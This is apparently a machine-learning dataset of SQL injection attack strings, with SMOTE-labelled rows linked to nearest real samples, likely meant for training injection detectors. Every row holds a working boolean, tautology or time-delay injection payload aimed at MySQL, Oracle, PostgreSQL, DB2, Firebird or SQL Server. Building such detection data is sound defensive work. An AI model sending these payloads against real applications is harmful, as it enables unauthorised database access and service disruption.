id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000117,attack,boolean,"1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002669,0.02447016608304526
SMOTE_000118,attack,boolean,-3846%' or 6872  =  6872 and '%'  =  ',nearest_attack_euclidean,R003625,1.0637282888140032
SMOTE_000119,attack,boolean,-5031' or 9323  =  9323#,nearest_attack_euclidean,R002358,0.1946135168177593
SMOTE_000120,attack,boolean,1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R001481,0.20056775332709675
SMOTE_000121,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000002,1.1920928955078125e-07
SMOTE_000122,attack,boolean,-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R001648,0.012766901280232498
SMOTE_000123,attack,boolean,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',nearest_attack_euclidean,R000212,0.6301556134024168
SMOTE_000124,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R002260,0.7030032770913938
SMOTE_000125,attack,boolean,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",nearest_attack_euclidean,R002416,0.01199304988133515
SMOTE_000126,attack,boolean,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000324,0.5930113180904598
SMOTE_000127,attack,boolean,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000151,0.02167095067490978
SMOTE_000128,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000071,0.06500280455359533
SMOTE_000129,attack,boolean,1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006,nearest_attack_euclidean,R001127,0.4062083592304669
SMOTE_000130,attack,boolean,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",nearest_attack_euclidean,R001777,0.38618531739322604
SMOTE_000131,attack,boolean,"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000485,0.13197128191098953
SMOTE_000132,attack,boolean,"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",nearest_attack_euclidean,R000845,0.14812366812669686
SMOTE_000133,attack,boolean,-1468'   )    )     )   or 4875  =  6163#,nearest_attack_euclidean,R001328,0.007726651545794972
SMOTE_000134,attack,boolean,"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001822,0.07769131693765552
SMOTE_000135,attack,boolean,-8465' where 5242  =  5242 or 3806  =  7423--,nearest_attack_euclidean,R000756,0.005509656145121584
SMOTE_000136,attack,boolean,"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000769,0.08934614785674079
SMOTE_000137,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000948,0.03486691683529065
SMOTE_000138,attack,boolean,"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001650,0.15811808412068287
SMOTE_000139,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003077,0.11280400931694909
SMOTE_000140,attack,boolean,1'  )   as epgz where 2898  =  2898 and 7028  =  2287#,nearest_attack_euclidean,R002665,0.09439311805543299
SMOTE_000141,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R002699,0.17294250423884946
SMOTE_000142,attack,boolean,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001709,0.19916056729756806
SMOTE_000143,attack,boolean,1'   )    )    and 6690  =  3250#,nearest_attack_euclidean,R001355,0.16294851193350535
SMOTE_000144,attack,boolean,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000883,0.00014217781919238242
SMOTE_000145,attack,boolean,"1%""   )    )    and 7358  =  6986--",nearest_attack_euclidean,R002778,0.10413612646192823
SMOTE_000146,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R003466,0.1090076384462677
SMOTE_000147,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000148,attack,boolean,"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",nearest_attack_euclidean,R000426,0.1328938487460136
SMOTE_000149,attack,boolean,end and    (    (   '%'  =  ',nearest_attack_euclidean,R001193,1.379113114160196
SMOTE_000150,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",nearest_attack_euclidean,R003616,0.19809773109447812
SMOTE_000151,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,0.031755075349361554
SMOTE_000152,attack,boolean,"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001845,0.015841591273767
SMOTE_000153,attack,boolean,1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'ujds'  =  'ujds,nearest_attack_euclidean,R002467,0.14643888513930034
SMOTE_000154,attack,boolean,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",nearest_attack_euclidean,R000604,0.528294883300018
SMOTE_000155,attack,boolean,"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R003016,0.24993087906614178
SMOTE_000156,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R002487,0.491008354592013
SMOTE_000157,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R002688,0.7967478502678355
SMOTE_000158,attack,boolean,end and    (    (   'vcaf' like 'vcaf,nearest_attack_euclidean,R001595,0.7981482224407586
SMOTE_000159,attack,boolean,"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002404,0.14878449276994973
SMOTE_000160,attack,boolean,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",nearest_attack_euclidean,R002080,0.04453558384170501
SMOTE_000161,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001462,0.10919944889104183
SMOTE_000162,attack,boolean,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R003045,0.3898158210920489
SMOTE_000163,attack,boolean,1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R003207,0.11805881642295285
SMOTE_000164,attack,boolean,"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'fzgy'  =  'fzgy",nearest_attack_euclidean,R003276,0.08691527777819
SMOTE_000165,attack,boolean,"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001728,0.3551462351889712
SMOTE_000166,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",nearest_attack_euclidean,R001850,0.3298100537735795
SMOTE_000167,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '",nearest_attack_euclidean,R001208,0.07326174382290049
SMOTE_000168,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- xgyc",nearest_attack_euclidean,R003549,0.09444524945203993
SMOTE_000169,attack,boolean,"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000276,0.021492265496766864
SMOTE_000170,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R003468,0.2626937296800311
SMOTE_000171,attack,boolean,-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,nearest_attack_euclidean,R000495,0.07213033660060739
SMOTE_000172,attack,boolean,"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000651,0.363746089820478
SMOTE_000173,attack,boolean,"1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R002522,0.1874093449560309
SMOTE_000174,attack,boolean,"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb",nearest_attack_euclidean,R001073,0.006337331544944394
SMOTE_000175,attack,boolean,"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R002024,0.17309570662384277
SMOTE_000176,attack,boolean,-7279  )   or 9898  =  9963 and   (  1481  =  1481,nearest_attack_euclidean,R001177,0.6088017456962991
SMOTE_000177,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",nearest_attack_euclidean,R001886,0.27572412925140954
SMOTE_000178,attack,boolean,-9650'  )   or 1390  =  3209,nearest_attack_euclidean,R001640,0.009137932478135402
SMOTE_000179,attack,boolean,"1%""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001666,0.5447715004380931
SMOTE_000180,attack,boolean,"1 where 3737  =  3737 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003435,0.006426430615436564
SMOTE_000181,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R001472,0.012867322419360854
SMOTE_000182,attack,boolean,"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000726,0.10341772911040109
SMOTE_000183,attack,boolean,"1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R003095,0.002495693695932697
SMOTE_000184,attack,boolean,-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R001391,0.12774700070038664
SMOTE_000185,attack,boolean,"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",nearest_attack_euclidean,R002880,0.5384440190489106
SMOTE_000186,attack,boolean,"-8633"" or 5099  =  5974",nearest_attack_euclidean,R003366,0.0444428656728534
SMOTE_000187,attack,boolean,-2291   )    )    or 4067  =  5666#,nearest_attack_euclidean,R000526,0.3656813484765584
SMOTE_000188,attack,boolean,"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000660,0.012518302723921858
SMOTE_000189,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002598,0.2876669765616105
SMOTE_000190,attack,boolean," end and ""mdje"" like ""mdje",nearest_attack_euclidean,R001011,0.31768934415962524
SMOTE_000191,attack,boolean,-9555'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'rwpq' like 'rwpq,nearest_attack_euclidean,R001154,0.07831001750532167
SMOTE_000192,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000976,0.0059203092335071246
SMOTE_000193,attack,boolean,"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",nearest_attack_euclidean,R003450,0.4398218709695353
SMOTE_000194,attack,boolean,"1""   )    )    as ihfw where 3949  =  3949 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001071,0.12082978067085258
SMOTE_000195,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000877,0.08120031415450674
SMOTE_000196,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R002430,0.26069096186728785
SMOTE_000197,attack,boolean,"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R002502,0.09211738471892716
SMOTE_000198,attack,boolean,"1""  )   where 7950  =  7950 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000617,0.06547133347300169
SMOTE_000199,attack,boolean,"1%' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002923,0.028709022823089264
SMOTE_000200,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",nearest_attack_euclidean,R001635,0.12569132587639376
SMOTE_000201,attack,boolean,"1 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002825,0.03667540085824757
SMOTE_000202,attack,boolean,1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa,nearest_attack_euclidean,R003644,0.030979803095676696
SMOTE_000203,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R002064,0.004042482954132241
SMOTE_000204,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",nearest_attack_euclidean,R003439,0.0793775173522365
SMOTE_000205,attack,boolean," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000058,0.049934127964430954
SMOTE_000206,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx",nearest_attack_euclidean,R002897,0.12520872247992423
SMOTE_000207,attack,boolean,-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,nearest_attack_euclidean,R001805,0.21280306710550068
SMOTE_000208,attack,boolean,"1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002547,0.0886042914631285
SMOTE_000209,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",nearest_attack_euclidean,R002377,0.14762992557072388
SMOTE_000210,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R001509,0.40066838572126506
SMOTE_000211,attack,boolean,"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000507,0.4126784375004791
SMOTE_000212,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R002037,0.41089946068323213
SMOTE_000213,attack,boolean,-4219' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,nearest_attack_euclidean,R003579,1.1646533398431698
SMOTE_000214,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",nearest_attack_euclidean,R002223,0.07745360588772998
SMOTE_000215,attack,boolean,1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'diyb' like 'diyb,nearest_attack_euclidean,R001901,0.5663065837200855
SMOTE_000216,attack,boolean,1%'  )   and 4061  =  2730#,nearest_attack_euclidean,R000666,0.06273989969680181
SMOTE_000217,attack,boolean,"1'+  (  select uzan where 4312  =  4312 and make_set  (  3129  =  9555,9555   )    )   +'",nearest_attack_euclidean,R001807,0.42756358458712035
SMOTE_000218,attack,boolean,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R002235,0.11462016693463889
SMOTE_000219,attack,boolean,"1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",nearest_attack_euclidean,R003580,0.042630020742393276
SMOTE_000220,attack,boolean,"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000975,0.25238877083386285
SMOTE_000221,attack,boolean,"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003177,0.3263162476196945
SMOTE_000222,attack,boolean,"1""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001525,0.05462244468290051
SMOTE_000223,attack,boolean,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'yvxg'  =  'yvxg,nearest_attack_euclidean,R001633,0.15342854264577055
SMOTE_000224,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R002790,0.011235180480014527
SMOTE_000225,attack,boolean,"1%""   )    )     )   and 8438  =  7620--",nearest_attack_euclidean,R002565,0.412243682663636
SMOTE_000226,attack,boolean,"1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R003067,0.46451445500851607
SMOTE_000227,attack,boolean,1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,nearest_attack_euclidean,R002555,0.022561504081841367
SMOTE_000228,attack,boolean,"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002929,0.4212797366333563
SMOTE_000229,attack,boolean,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,nearest_attack_euclidean,R002684,0.08553161866581166
SMOTE_000230,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R002122,0.04909971912943819
SMOTE_000231,attack,boolean,"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R002102,0.03654402019105666
SMOTE_000232,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",nearest_attack_euclidean,R002154,0.31958093443482843
SMOTE_000233,attack,boolean,"1  )   where 9724  =  9724 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003467,0.1102495323727228
SMOTE_000234,attack,boolean,"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",nearest_attack_euclidean,R001095,0.43343379690663436
SMOTE_000235,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002764,0.48731029499009165
SMOTE_000236,attack,boolean,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",nearest_attack_euclidean,R001501,0.1970827246600869
SMOTE_000237,attack,boolean,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,nearest_attack_euclidean,R002436,0.025249817988891518
